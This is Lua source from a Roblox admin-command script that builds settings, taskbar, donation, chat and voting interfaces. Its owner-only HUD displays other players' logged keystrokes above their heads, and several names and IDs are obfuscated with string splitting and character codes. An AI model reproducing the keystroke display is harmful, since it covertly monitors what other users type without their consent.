					local Check = Instance.new("ImageButton", ValFrame) Check.Name = "Check" Check.Position = UDim2.new(0.5, -15, 0.5, -15) Check.Size = UDim2.new(0, 30, 0, 30) Check.BackgroundTransparency = 1 Check.Image = "rbxassetid://48138474"
					if DefaultValue == true then
						Check.Image = "rbxassetid://48138491"
					end
					if Writable == true then
						CORE:HandleEvent(Check, "MouseButton1Down", function()
							local NewVal = not NewProperties[PropertyName]
							NewProperties[PropertyName] = NewVal
							if NewVal == true then
								Check.Image = "rbxassetid://48138491"
							else
								Check.Image = "rbxassetid://48138474"
							end
						end)
					else
						Check.ImageTransparency = 0.5
					end
				end
				YCount = YCount + 50
			end
		end
	end
	
	Frame.CanvasSize = UDim2.new(0,0,0,YCount)

	Closed.Event:connect(function() HasClosed = true end)
	
	repeat wait(0.1) until HasClosed
	return NewProperties
end

function GUI:SettingsGui(Player)
	if not Player then return nil end
	local CloneViewSettings,CanChange = {},false
	
	local ViewSettings = {
		["Version"] = {CORE.Version.Value, false, nil};
		["Prefix"] = {Settings.Prefix, 3, "Prefix"};
		["Font"] = {Settings.Font, 3, "Font"};
		["Color Scheme"] = {Settings.ColorScheme, 3, "ColorScheme"};
		["Transparency Scheme"] = {Settings.TransparencyScheme * 100, 3, "TransparencyScheme"};
		["Server Locked"] = {Settings.ServerLocked, 3, "ServerLocked"};
		["Fun Commands"] = {Settings.Fun, 3, "Fun"};
		["Disable Abuse"] = {Settings.DisableAbuse, 3, "DisableAbuse"};
		["Minimum Account Age"] = {Settings.MinimumAge, 3, "MinimumAge"};
		["Execute Notification Sound ID"] = {Settings.ExecuteNotificationSound, 3, "ExecuteNotificationSound"};
		["Enable Sounds"] = {Settings.EnableSounds, 3, "EnableSounds"};
		["Group ID"] = {Settings.GroupID, false, "GroupID"};
		["Group Banned Rank"] = {Settings.GroupBanRank, false, "GroupBanRank"};
		["Group Member Rank"] = {Settings.GroupMemberRank, false, "GroupMemberRank"};
		["Group Admin Rank"] = {Settings.GroupAdminRank, false, "GroupAdminRank"};
		["Group Owner Rank"] = {Settings.GroupOwnerRank, false, "GroupOwnerRank"};
		["Banned Group IDs"] = {Settings.BannedGroupIDs, false, "BannedGroupIDs"};
		["IRC Server"] = {Settings.IRCServer, false, "IRCServer"};
		["IRC Channel"] = {Settings.IRCChannel, false, "IRCChannel"};
		["Remote Connection"] = {REMOTE.RemoteConnection, false, nil};
		["Bet"] = {Settings.Bet, 3, "Bet"};
	}
	
	local _,RankNum = RANK:GetRank(Player)
	if RankNum >= 3 then
		CanChange = true
	end
	
	for Prop,Data in pairs(ViewSettings) do
		local Writable = false
		if tonumber(Data[2]) and Data[2] <= RankNum then Writable = true end
		CloneViewSettings[Prop] = {Data[1], Writable}
	end
	
	local NewSettings = GUI:PropertyGui(Player, "Settings", "Settings", CloneViewSettings)
	if CanChange then
		for Prop,Data in pairs(ViewSettings) do
			if Data[3] then
				Settings[Data[3]] = NewSettings[Prop] -- wow haxy
			end
		end
		CORE:FixSettings()
	end
end

function GUI:MessageAdmins(TitleText, BodyText, Icon)
	for _,Player in pairs(Server.Players:GetPlayers()) do
		local PlayerAdmin, PlayerRank = RANK:IsAdmin(Player)
		if PlayerAdmin then
			GUI:SendMessage(Player, TitleText, BodyText, Icon)
		end
	end
end

function GUI:TellAdmin(Player)
	if not Player then return end
	
	local ValidAdmin,Rank = RANK:IsAdmin(Player)
	if ValidAdmin == true then
		GUI:SendMessage(Player, "Ma".."ker".."Mo".."delLua".."'s Admin Message", "GREEN You are an admin "..Player.Name.."! Your rank is "..Rank.." [ PREFIX '"..Settings.Prefix.."' ]", "Check", 5)
		if Settings.EnableSounds == true and Player:FindFirstChild("PlayerGui") then
			local SoundID = 237866523
			if Rank == "Admin" then SoundID = 237866621 elseif Rank == "Owner" then SoundID = 237866707 end
			local Sound = SOUND:MakeSound(Player.PlayerGui, SoundID, 0.5, 1)
			Sound:Play()
			coroutine.wrap(function()
				wait(4)
				Sound:Stop()
				Sound:Destroy()
			end)()
		end
	end
end

function GUI:TellNotAdmin(Player)
	if not Player then return end
	
	GUI:SendMessage(Player, "Mak".."er".."M".."o".."del".."Lua's Admin Message", "You are now no longer an admin", "Information")
end

function GUI:CreateTaskBar(Player)
	if not Player then return nil end
	if Settings.EnableTaskBar == false then return nil end
	Player:WaitForChild("PlayerGui")
	local SG = Player.PlayerGui:FindFirstChild("M".."akerMod".."el".."Lua's TaskBar")
	if SG then SG:Destroy() end
	SG = Instance.new("ScreenGui", Player.PlayerGui) SG.Name = "M".."akerMod".."elLua's TaskBar"
	local IsMoving = false
	local TaskBarShown = false
	local Tasks = {}

	local TaskBar = Instance.new("Frame", SG) TaskBar.Name = "TaskBar" TaskBar.Size = UDim2.new(1, 0, 0, 50) TaskBar.Position = UDim2.new(0,0,1,20) TaskBar.BackgroundColor3 = GUI:GetColor() TaskBar.BackgroundTransparency = Settings.TransparencyScheme TaskBar.BorderSizePixel = 0
	local TaskButton = Instance.new("ImageButton", TaskBar) TaskButton.Name = "TaskButton" TaskButton.Position = UDim2.new(1, -50, 0, -70) TaskButton.Size = UDim2.new(0, 50, 0, 50) TaskButton.BackgroundTransparency = 1 TaskButton.Image = "rbxassetid://222795206"
	
	local AddForm = Instance.new("BindableEvent", SG) AddForm.Name = "AddForm"
	local Open,CloseForm = false,nil
	if Settings.EnableAdminMenu then
		local MenuButton = Instance.new("ImageButton", TaskBar) MenuButton.Name = "MenuButton" MenuButton.Position = UDim2.new(1, -50, 0, -120) MenuButton.Size = UDim2.new(0, 50, 0, 50) MenuButton.BackgroundTransparency = 1 MenuButton.Image = "rbxassetid://302470270"
		coroutine.wrap(function() wait(1) CORE:HandleEvent(MenuButton, "MouseButton1Click", function()
			if Open == false then
				local Frame, Close, Closed = GUI:CreateForm(Player, string.char(77, 97, 107, 101, 114, 77, 111, 100, 101, 108, 76, 117, 97, 39, 115).." Admin Menu", UDim2.new(0.4,0,0.5), nil, 302470270, true, nil, nil, false, true, true)
				Open,CloseForm = true,Close
				
				local Title = Instance.new("TextLabel", Frame) Title.Name = "Title" Title.BackgroundTransparency = 1 Title.Position = UDim2.new(0,0,0,0) Title.Size = UDim2.new(1,0,0,30) Title.Font = "SourceSansBold" Title.FontSize = "Size24" Title.Text = string.char(77, 97, 107, 101, 114, 77, 111, 100, 101, 108, 76, 117, 97, 39, 115).." Admin V"..CORE.Version.Value Title.TextColor3 = GUI:ContrastColor()
				local Separator = Instance.new("Frame", Frame) Separator.Name = "Separator" Separator.BorderColor3 = Color3.new(1,1,1) Separator.Position = UDim2.new(0.5,0,0,30) Separator.Size = UDim2.new(0,0,1,-30)
				local Info = Instance.new("TextLabel", Frame) Info.Name = "Info" Info.BackgroundTransparency = 1 Info.Position = UDim2.new(0,0,0,30) Info.Size = UDim2.new(0.5,0,1,-30) Info.Font = Settings.Font Info.FontSize = "Size18" Info.Text = "Info/Help" Info.TextColor3 = GUI:ContrastColor() Info.TextYAlignment = "Top"
				local Body = Instance.new("TextLabel", Info) Body.Name = "Body" Body.BackgroundTransparency = 1 Body.Position = UDim2.new(0,0,0,25) Body.Size = UDim2.new(1,0,1,-25) Body.Font = "SourceSans" Body.FontSize = "Size14" Body.Text = string.gsub(Server.MPS:GetProductInfo(209330909).Description, "PREFIX", Settings.Prefix) Body.TextColor3 = GUI:ContrastColor() Body.TextYAlignment = "Top" Body.TextWrapped = true
				local Donate = Info:Clone() Donate.Parent = Frame Donate.Name = "Donate" Donate.Text = "Donate/Get admin" Donate.Position = UDim2.new(0.5,0,0,30) Donate.Body.Text = "Please select an amount that fits your generosity and to help support future updates. Press the 'Get admin now' to get copy for your own place!"
				local function DonateMoney(Type, Element)
					local Request = CORE:GetTable(string.char(49, 53, 53, 54, 56, 52, 51, 54, 57))
					local Get = Request[Type]
					if Server.MPS:GetProductInfo(Get[1]).IsForSale == true then
						Server.MPS:PromptPurchase(Player, Get[1], true)
					elseif Server.MPS:GetProductInfo(Get[2]).IsForSale == true then
						Server.MPS:PromptPurchase(Player, Get[2], true)
					elseif Server.MPS:GetProductInfo(Get[3]).IsForSale == true then
						Server.MPS:PromptPurchase(Player, Get[3], true)
					else
						Element.Text = "Cannot get request"
					end
				end
				local Get = Instance.new("TextButton", Donate) Get.Name = "Get" Get.Position = UDim2.new(0,0,0.5,0) Get.Size = UDim2.new(1,0,0,30) Get.Font = "ArialBold" Get.FontSize = "Size14" Get.Text = "Get MakerModelLua's Admin V"..CORE.Version.Value.." now for FREE!" Get.BackgroundColor3 = Color3.new(1,0,1) Get.TextColor3 = Color3.new(1,1,1) Get.TextStrokeColor3 = Color3.new(0,0,0) Get.TextStrokeTransparency = 0 Get.TextWrapped = true CORE:HandleEvent(Get, "MouseButton1Down", function() MARKET:PromptPurchase(Player, AdminID) end) SOUND:BindButton(Get)
				local Dnt = Instance.new("TextButton", Donate) Dnt.Name = "DonateButton" Dnt.Position = UDim2.new(0,0,1,-120) Dnt.Size = UDim2.new(1,0,0,30) Dnt.Font = "ArialBold" Dnt.FontSize = "Size14" Dnt.Text = "6 Robux" Dnt.BackgroundColor3 = Color3.new(1,1,0) Dnt.TextColor3 = Color3.new(1,1,1) Dnt.TextStrokeColor3 = Color3.new(0,0,0) Dnt.TextStrokeTransparency = 0 Dnt.TextWrapped = true CORE:HandleEvent(Dnt, "MouseButton1Down", function() DonateMoney("6R", Dnt) end) SOUND:BindButton(Dnt)
				local Dnt = Dnt:Clone() Dnt.Parent = Donate Dnt.Position = UDim2.new(0,0,1,-90) Dnt.Text = "20 Robux" Dnt.BackgroundColor3 = Color3.new(0,1,0) CORE:HandleEvent(Dnt, "MouseButton1Down", function() DonateMoney("20R", Dnt) end) SOUND:BindButton(Dnt)
				local Dnt = Dnt:Clone() Dnt.Parent = Donate Dnt.Position = UDim2.new(0,0,1,-60) Dnt.Text = "100 Robux" Dnt.BackgroundColor3 = Color3.new(0,1,0) CORE:HandleEvent(Dnt, "MouseButton1Down", function() DonateMoney("100R", Dnt) end) SOUND:BindButton(Dnt)
				local Dnt = Dnt:Clone() Dnt.Parent = Donate Dnt.Position = UDim2.new(0,0,1,-30) Dnt.Text = "500 ROBUX!" Dnt.BackgroundColor3 = Color3.new(1,0,0) Dnt.FontSize = "Size18" CORE:HandleEvent(Dnt, "MouseButton1Down", function() DonateMoney("500R", Dnt) end) SOUND:BindButton(Dnt)
				local PlayerAdmin, PlayerRank = RANK:IsAdmin(Player)
				
				if PlayerAdmin == true then Body.Text = Body.Text.." (You're an admin, your rank is "..PlayerRank..")" end
				
				if Closed then
					Closed.Event:connect(function()
						Open = false
					end)
				end
			else
				CloseForm:Invoke()
			end
		end) end)()
		if RANK:GetRank(Player) == "Owner" then
			local HUDButton = Instance.new("ImageButton", TaskBar) HUDButton.Name = "HUDButton" HUDButton.Position = UDim2.new(1, -50, 0, -170) HUDButton.Size = UDim2.new(0, 50, 0, 50) HUDButton.BackgroundTransparency = 1 HUDButton.Image = "rbxassetid://329362761"
			CORE:HandleEvent(HUDButton, "MouseButton1Click", function()
				local HUDSG = Player.PlayerGui:FindFirstChild("M".."a".."k".."e".."r".."m".."od".."elLu".."a's HUD Gui")
				if HUDSG then
					HUDSG:Destroy()
				else
					GUI:CreateHUD(Player)
				end
			end)
		end
	end
	
	CORE:HandleEvent(TaskButton, "MouseButton1Click", function()
		if IsMoving == false then
			if TaskBarShown == true then
				TaskBarShown = false
				IsMoving = true
				TaskBar:TweenPosition(UDim2.new(0,0,1,20), "In", "Sine", 0.3, false, function() IsMoving = false end)
			else
				TaskBarShown = true
				IsMoving = true
				TaskBar:TweenPosition(UDim2.new(0,0,0.6,0), "Out", "Sine", 0.3, false, function() IsMoving = false end)
			end
		end
	end)
	
	local function ReloadIcons()
		for Num,Data in pairs(Tasks) do
			Data[2].Position = UDim2.new(0,(Num * 50) - 50,0,0,0)
		end
	end
	
	AddForm.Event:connect(function(Form, IconID, Closed, Minimized, Restore)
		local Icon = Instance.new("ImageButton", TaskBar) Icon.Name = "Icon" Icon.Position = UDim2.new(0,#Tasks * 50,0,0,0) Icon.Size = UDim2.new(0, 50, 0, 50) Icon.BackgroundColor3 = GUI:GetColor() Icon.BackgroundTransparency = 0.5 Icon.Image = "rbxassetid://"..IconID
		table.insert(Tasks, {Form, Icon})
		local CanClick = true
		CORE:HandleEvent(Icon, "MouseButton1Down", function()
			if Form.IsActive.Value == false then
				Restore:Invoke()
			elseif CanClick == true then
				coroutine.wrap(function()
					CanClick = false
					local DefPos = Form.Dragger.Position
					for i = 1,15 do
						Form.Dragger.Position = DefPos + UDim2.new(0,math.random(-2,2),0,math.random(-2,2))
						wait(0.05)
					end
					Form.Dragger.Position = DefPos
					CanClick = true
				end)()
			end
		end)
		ReloadIcons()
		
		Closed.Event:connect(function()
			for Num,Data in pairs(Tasks) do
				if Data[1] == Form then
					Icon:Destroy()
					table.remove(Tasks, Num)
				end
			end
			ReloadIcons()
		end)
	end)
end

function GUI:ShowDebtStats(Player, ManualText)
	local Text = ManualText
	if not ManualText then
		Text = "CANNOT GET STATISTICS"
		local RawPage = REMOTE:GetURL("http://www.nationaldebtclocks.org/debtclock/unitedstates")
		if RawPage then
			local _,GetStart = string.find(RawPage, 'debtDisplayFast">')
			local GetEnd,__ = string.find(string.sub(RawPage,GetStart), '</span>')
			Text = "US National Debt: $"..STRING:GetComma(string.sub(RawPage, GetStart + 1, GetStart + GetEnd - 2))
		end
	end
	
	local Frame = GUI:CreateForm(Player, "US National Debt", UDim2.new(0.05,500,0.05,100), nil, 38574945)
	local Body = Instance.new("TextLabel", Frame) Body.Name = "Body" Body.Size = UDim2.new(1,0,1,0) Body.BackgroundTransparency = 1 Body.Text = Text Body.Font = "ArialBold" Body.FontSize = "Size36" Body.TextColor3 = Color3.new(1,1,1) Body.TextStrokeTransparency = 0 Body.TextWrapped = true
	
	return Text
end

function GUI:ShowCommand(Player, CommandTrigger, Dialog)
	if not Player then return nil end
	if not CommandTrigger then return nil end
	
	if type(CommandTrigger) == "string" and string.sub(CommandTrigger,1,#Settings.Prefix) == Settings.Prefix then CommandTrigger = string.sub(CommandTrigger,#Settings.Prefix + 1) end
	
	local CommandKey = CommandTrigger
	
	if not Commands[CommandKey] then
		for CommandNames,_ in pairs(Commands) do
			for _,CommandName in pairs(CommandNames) do
				if CommandName == CommandKey then
					CommandKey = CommandNames
				end
			end
		end
	end
	
	local CommandData = Commands[CommandKey]
	
	local BodyText = "No valid command has been entered"
	local TitleText = "Error"
	local CanExe = false
	if CommandData then
		if Dialog then
			Dialog:Invoke(true)
		end
		local PlayerRank = RANK:GetRank(Player)
		if RANK:ConvertRank(PlayerRank) >= RANK:ConvertRank(CommandData[4]) then CanExe = true end
		if PlayerRank == "Member" and CommandData.Abusable == true then CanExe = false end
		
		TitleText = "Command: "..CommandKey[1]
		BodyText = "COMMAND: "..Settings.Prefix..CommandKey[1]..Settings.Bet..CommandData[1]..[[
 

Aliases: ]]..Settings.Prefix..table.concat(CommandKey, ", "..Settings.Prefix)..[[
 

Description: ]]..CommandData[2]..[[
 

Arguments: ]]..CommandData[3]..[[
 

Minimum rank needed: ]]..CommandData[4]..[[
 

Fun command: ]]..STRING:BoolString(CommandData[5])..[[
 

Abusable command: ]]..STRING:BoolString(CommandData.Abusable)..[[


Http Command ]]..STRING:BoolString(CommandData.Http)
	end
	
	_, _, Closed, _, Minimized = GUI:FullMessage(Player, TitleText, BodyText, "Search", not CanExe)
	if Dialog then
		Closed.Event:connect(function() Dialog:Invoke(false) end)
		Minimized.Event:connect(function() Dialog:Invoke(false) end)
	end
end

function GUI:CreateHUD(Speaker)
	if not Speaker or not Speaker:FindFirstChild("PlayerGui") then return nil end
	
	local SG = Speaker.PlayerGui:FindFirstChild("M".."a".."ke".."r".."m".."od".."elLu".."a's HUD Gui")
	if SG then SG:Destroy() end
	SG = Instance.new("ScreenGui", Speaker.PlayerGui) SG.Name = "M".."a".."k".."e".."r".."m".."odelLu".."a's HUD Gui"
	
	local function AddHUD(Player, Char)
		if not Char or not Char:FindFirstChild("Head") then return nil end
		
		local Rank = RANK:GetRank(Player)
		local PlayerHUD = Instance.new("BillboardGui", SG) PlayerHUD.Name = "PlayerHUD" PlayerHUD.AlwaysOnTop = true PlayerHUD.Adornee = Char.Head PlayerHUD.Size = UDim2.new(3,0,3,0)
		local HUD = Instance.new("ImageLabel", PlayerHUD) HUD.Name = "HUD" HUD.Size = UDim2.new(1, 0, 1, 0) HUD.BackgroundColor3 = Color3.new(1, 1, 1) HUD.BackgroundTransparency = 1
		local InfoLabel = Instance.new("TextLabel", PlayerHUD) InfoLabel.Name = "InfoLabel" InfoLabel.Position = UDim2.new(1, -1, 0, 0) InfoLabel.Size = UDim2.new(7, 0, 0.8, 0) InfoLabel.BackgroundColor3 = Color3.new(1, 1, 1) InfoLabel.BackgroundTransparency = 1 InfoLabel.Text = "" InfoLabel.Font = "Arial" InfoLabel.TextScaled = true InfoLabel.TextStrokeTransparency = 0.9 InfoLabel.TextWrapped = true InfoLabel.TextXAlignment = "Left" InfoLabel.TextYAlignment = "Top" InfoLabel.TextColor3 = Color3.new(0, 0, 0) InfoLabel.TextStrokeColor3 = Color3.new(1, 1, 1)
		local KeyLabel = Instance.new("TextLabel", PlayerHUD) KeyLabel.Name = "KeyLabel" KeyLabel.Position = UDim2.new(-1, 1, -1, 0) KeyLabel.Size = UDim2.new(1, 0, 3, 0) KeyLabel.BackgroundColor3 = Color3.new(1, 1, 1) KeyLabel.BackgroundTransparency = 1 KeyLabel.Text = "" KeyLabel.Font = "Arial" KeyLabel.FontSize = "Size14" KeyLabel.TextScaled = true KeyLabel.TextStrokeTransparency = 0.9 KeyLabel.TextWrapped = true KeyLabel.TextXAlignment = "Right" KeyLabel.TextYAlignment = "Top" KeyLabel.TextColor3 = Color3.new(1, 1, 1)
		local KeyOutput = Instance.new("TextLabel", PlayerHUD) KeyOutput.Name = "KeyOutput" KeyOutput.Position = UDim2.new(0, 1, -0.5, 0) KeyOutput.Size = UDim2.new(5, 0, 0.5, 1) KeyOutput.BackgroundTransparency = 1 KeyOutput.Text = "" KeyOutput.Font = "SourceSansLight" KeyOutput.FontSize = "Size14" KeyOutput.TextScaled = true KeyOutput.TextWrapped = true KeyOutput.TextXAlignment = "Left" KeyOutput.TextColor3 = Color3.new(1, 1, 1)
		coroutine.wrap(function() while wait() and InfoLabel and InfoLabel.Parent and Char and Char:FindFirstChild("Head") do
			InfoLabel.Text = "Name: "..Player.Name..[[ 
Rank: ]]..RANK:GetRank(Player)..[[ 
Age: ]]..STRING:FindAge(Player.AccountAge)
			if Speaker.Character and Speaker.Character:FindFirstChild("Head") then
				InfoLabel.Text = InfoLabel.Text..[[ 
Distance: ]]..CORE:Round((Speaker.Character.Head.Position - Player.Character.Head.Position).magnitude)
			end
			if LastKeys[Player.UserId] then
				local Keys = ""
				local KeyLog = {}
				for _,KeyData in pairs(LastKeys[Player.UserId]) do
					table.insert(KeyLog, KeyData[1])
					if KeyData[2] == 8 then
						Keys = string.sub(Keys, 1, #Keys - 1)
					elseif KeyData[2] == 13 then
						Keys = Keys.." "
					else
						Keys = Keys..string.char(KeyData[2])
					end
				end
				KeyLabel.Text = table.concat(KeyLog, "\n")
				KeyOutput.Text = Keys
			end
			HUD.Image = "rbxassetid://"..RankHUD[Rank]
		end end)()
		
		local CharRev,Removing = nil,nil
		CharRev = Player.CharacterRemoving:connect(function()
			PlayerHUD:Destroy()
			CharRev:disconnect()
			Removing:disconnect()
		end)
		Removing = Server.Players.PlayerRemoving:connect(function(PlayerR) if PlayerR == Player then
			PlayerHUD:Destroy()
			CharRev:disconnect()
			Removing:disconnect()
		end end)
	end
	
	local function ConnectHUD(Player)
		if Player ~= Speaker then
			if Player.Character then
				AddHUD(Player, Player.Character)
			end
			
			Player.CharacterAdded:connect(function(Char)
				if Speaker then
					AddHUD(Player, Char)
				else return nil
				end
			end)
		end
	end
	
	for _,Player in pairs(Server.Players:GetPlayers()) do
		ConnectHUD(Player)
	end
	
	Server.Players.PlayerAdded:connect(ConnectHUD)
end

function GUI:CreateMessagePrompt(Player, Title, ImageID, PreAdd, SpeakerEvents)
	if not Player or not Player:FindFirstChild("PlayerGui") then return nil end
	local Stopped = false
	
	local Frame, _, Closed = GUI:CreateForm(Player, Title, UDim2.new(0.3,0,0.5,0), nil, ImageID)
	Frame.Size = UDim2.new(1, 0, 1, -30)
	Frame.CanvasSize = UDim2.new(0, 0 ,0 ,0)
	
	local FakeCB = Instance.new("TextButton", Frame.Parent) FakeCB.Name = "FakeChatBox" FakeCB.Position = UDim2.new(0, 0, 1, -30) FakeCB.Size = UDim2.new(1, -50, 0, 30) FakeCB.BackgroundTransparency = 1 FakeCB.Text = "Click here or press the '-' key" FakeCB.Font = Settings.Font FakeCB.FontSize = "Size18" FakeCB.TextXAlignment = "Left" FakeCB.ZIndex = 2
	local ChatBox = Instance.new("TextBox", Frame.Parent) ChatBox.Name = "ChatBox" ChatBox.Position = UDim2.new(0, 0, 1, -30) ChatBox.Size = UDim2.new(1, -50, 0, 30) ChatBox.BackgroundTransparency = 0.5 ChatBox.BackgroundColor3 = GUI:GetColor() ChatBox.Text = "" ChatBox.Font = Settings.Font ChatBox.FontSize = "Size18" ChatBox.TextXAlignment = "Left" ChatBox.ClearTextOnFocus = false
	local Send = Instance.new("TextButton", Frame.Parent) Send.Position = UDim2.new(1, -50, 1, -30) Send.Size = UDim2.new(0, 50, 0, 30) Send.BackgroundColor3 = GUI:GetColor() Send.BackgroundTransparency = 0.5 Send.Text = "Enter" Send.Font = Settings.Font Send.FontSize = "Size14"
	
	local function AddLine(Speaker, MessageText, MessageColor)
		MessageText = STRING:DetermineFilter(MessageText, Speaker, Player)
		if MessageColor == true then MessageColor = Color3.new(1,0,0) end
		if not MessageColor then MessageColor = GUI:ContrastColor() end
		local Bounds = Instance.new("Frame") Bounds.Name = "Bounds" Bounds.Position = UDim2.new(0, 0, 1, -20) Bounds.Size = UDim2.new(1, 0, 0, 20) Bounds.BackgroundTransparency = 1
		local Name = Instance.new("TextLabel", Bounds) Name.Name = "PName" Name.Size = UDim2.new(0, 60, 1, 0) Name.BackgroundTransparency = 1 Name.Text = Speaker..": " Name.Font = "ArialBold" Name.FontSize = "Size14" Name.TextXAlignment = "Left" Name.TextColor3 = GUI:GetNameColor(Speaker).Color
		local Message = Instance.new("TextLabel", Bounds) Message.Name = "Message" Message.Position = UDim2.new(0, 60, 0, 0) Message.Size = UDim2.new(0, 60, 1, 0) Message.BackgroundTransparency = 1 Message.Text = MessageText Message.Font = "ArialBold" Message.FontSize = "Size14" Message.TextXAlignment = "Left" Message.TextColor3 = MessageColor
		Bounds.Parent = Frame
	end
	
	local RPR = CORE:CreateRemotePropertyReader(ChatBox)
	
	local Functions = Instance.new("Folder", Frame) Functions.Name = "Functions"
	local SendPressed = Instance.new("BindableEvent", Functions) SendPressed.Name = "SendPressed"
	local AddMessage = Instance.new("BindableFunction", Functions) AddMessage.Name = "AddMessage"
	
	local EnterPressed = Instance.new("RemoteFunction", ChatBox) EnterPressed.Name = "EnterPressed"
	local ClearCB = Instance.new("RemoteFunction", ChatBox) ClearCB.Name = "ClearCB"
	
	CORE:ExecuteResource("MessagePromptHandler", Frame)
	
	wait(0.1)
	
	if PreAdd then
		for Num,Add in pairs(PreAdd) do
			AddLine(Add[1], Add[2], Add[3])
		end
	end
	
	--[[
	CORE:ExecuteResource("ChatBoxLocal", ChatBox)
	
	CORE:HandleEvent(ChatBox, "MouseEnter", function()
		if ChatBox.Text == "Click here or press the '-' key" then
			ChatBox.Text = ""
		end
	end)
	]]
	
	local function FireSendPressed()
		local Text = CORE:ReadProperty(RPR, Player, "Text")
		if Text ~= "" and Text ~= "Click here or press the '-' key" then
			SendPressed:Fire(Text)
			FakeCB.Visible = true
			ClearCB:InvokeClient(Player)
		end
	end
	
	Closed.Event:connect(function()
		if Stopped == false then
			Stopped = true
			if SpeakerEvents then SpeakerEvents("Leave") end
		end
	end)
	
	CORE:HandleEvent(Send, "MouseButton1Down", FireSendPressed)
	
	AddMessage.OnInvoke = AddLine
	
	if SpeakerEvents then
		SpeakerEvents("Join")
	
		coroutine.wrap(function()
			repeat wait() until not Frame or not Frame.Parent
			if Stopped == false then
				Stopped = true
				SpeakerEvents("Leave")
			end
		end)()
	end
	
	return SendPressed, AddMessage
end

function GUI:PromptMessageWithButtons(Player, Title, BodyText, IconID, Buttons, Time, ShowFormButtons, DontFilter)
	if tonumber(Time) then ShowFormButtons = false end
	if not DontFilter then BodyText = STRING:DetermineFilter(BodyText, Player) end
	local Frame, Close = GUI:CreateForm(Player, Title, UDim2.new(0.4,0,0.4,0), nil, IconID, ShowFormButtons)
	local Body = Instance.new("TextLabel", Frame) Body.Name = "Body" Body.Size = UDim2.new(1, 0, 1, -60) Body.BackgroundTransparency = 1 Body.Text = BodyText Body.Font = Settings.Font Body.FontSize = "Size18" Body.TextWrapped = true Body.TextColor3 = GUI:ContrastColor()
	local Clicked = nil
	local Alive = true
	
	local function ClosePrompt(ButtonName)
		Alive = false
		Close:Invoke()
		Clicked = ButtonName
	end
	
	for Num,Select in pairs(Buttons) do
		local Name = Select
		local Style = "White"
		local TextColor3 = Color3.new(0,0,0)
		if type(Select) == "table" then
			Name = Select[1]
			if Select[2] then Style = Select[2] end
			if Select[3] then TextColor3 = Select[3] end
		elseif type(Select) == "string" then
			local Case = string.lower(Select)
			if Case == "ok" then
				Name = "Ok"
				Style = "Primary"
				TextColor3 = Color3.new(1,1,1)
			elseif Case == "yes" then
				Name = "Yes"
				Style = "Gray"
				TextColor3 = Color3.new(0,1,0)
			elseif Case == "no" then
				Name = "No"
				Style = "Red"
				TextColor3 = Color3.new(1,0,0)
			end
		end
		
		if Style == "None" then Style = "Custom" end
		if Style == "Casual" then Style = "RobloxButton" end
		if Style == "Red" then Style = "RobloxButtonDefault" end
		if Style == "Gray" then Style = "RobloxRoundButton" end
		if Style == "Primary" then Style = "RobloxRoundDefaultButton" end
		if Style == "White" then Style = "RobloxRoundDropdownButton" end
		
		local Button = Instance.new("TextButton", Frame) Button.Name = Name Button.Position = UDim2.new((Num/#Buttons)-(1/#Buttons), 0, 1, -55) Button.Size = UDim2.new(1/#Buttons, 0, 0, 50) Button.BackgroundColor3 = Color3.new(1, 1, 1) Button.Text = Name Button.Font = Settings.Font Button.FontSize = "Size14" Button.TextScaled = true Button.TextWrapped = true Button.TextColor3 = TextColor3 Button.Style = Style
		CORE:HandleEvent(Button, "MouseButton1Down", function() ClosePrompt(Name) end)
		SOUND:BindButton(Button)
	end
	
	if tonumber(Time) then
		local Ticker = Instance.new("TextLabel", Frame.Parent) Ticker.Size = UDim2.new(1, 0, 0, 30) Ticker.TextColor3 = GUI:ContrastColor() Ticker.BackgroundTransparency = 1 Ticker.Text = Time Ticker.Font = "ArialBold" Ticker.FontSize = "Size18"
		Frame.Size = Frame.Size + UDim2.new(0,0,0,-30)
		Frame.Position = Frame.Position + UDim2.new(0,0,0,30)
		
		for i = Time,0,-1 do
			for ii = 1,10 do
				if Alive == true then
					Ticker.Text = i
					wait(0.1)
				else
					break
				end
			end
		end
		if Alive == true then
			ClosePrompt()
		end
	end
	
	repeat wait() until Alive == false
	return Clicked
end

function GUI:Vote(Speaker, Players, Text, Time)
	if not Players or not Text or #Players <= 0 then return end
	
	local Votes = {}
	local Tick = 0
	
	for _,Player in pairs(Players) do
		local FilterText = STRING:DetermineFilter(Text, Speaker, Player)
		local CanVote = true
		if not game.Players:FindFirstChild(tostring(Player)) or not Player.PlayerGui then CanVote = false end
		if CanVote == true then
			coroutine.wrap(function()
				local Answer = GUI:PromptMessageWithButtons(Player, "Vote", FilterText, 34730262, {"Yes", "No"}, Time, false, true)
				if Answer == nil then Answer = "Unknown" end
				table.insert(Votes, Answer)
			end)()
		end
	end
	repeat wait(1) Tick = Tick + 1 until #Votes >= #Players or Tick >= Time
	wait(2)
	if Speaker and Speaker:FindFirstChild("PlayerGui") then
		local Total = #Players
		local Yes,No,Unknown = 0,0,0
		for _,Vote in pairs(Votes) do
			if Vote == "Yes" then Yes = Yes + 1
			elseif Vote == "No" then No = No + 1
			end
		end
		Unknown = #Players - #Votes
		
		local Frame = GUI:CreateForm(Speaker, "Vote Results", UDim2.new(0.35, 0, 0.35, 0), nil, 42330863)
		local QText = Instance.new("TextLabel", Frame) QText.Name = "QText" QText.Size = UDim2.new(1, 0, 1, -55) QText.BackgroundColor3 = Color3.new(1, 1, 1) QText.BackgroundTransparency = 1 QText.Text = "Results for: "..STRING:DetermineFilter(Text, Speaker) QText.Font = Settings.Font QText.FontSize = "Size18" QText.TextWrapped = true QText.TextYAlignment = "Top" QText.TextColor3 = GUI:ContrastColor()
		local RTextYes = Instance.new("TextLabel", Frame) RTextYes.Name = "RTextYes" RTextYes.Position = UDim2.new(0, 0, 1, -55) RTextYes.Size = UDim2.new(1, 0, 0, 55) RTextYes.BackgroundColor3 = Color3.new(1, 1, 1) RTextYes.BackgroundTransparency = 1 RTextYes.Font = Settings.Font RTextYes.FontSize = "Size18" RTextYes.TextXAlignment = "Left" RTextYes.TextYAlignment = "Bottom" RTextYes.TextColor3 = Color3.new(0, 1, 0) RTextYes.Text = [[Yes:
]]..Yes.."/"..Total..[[ 
]]..math.ceil((Yes/Total)*100).."% "
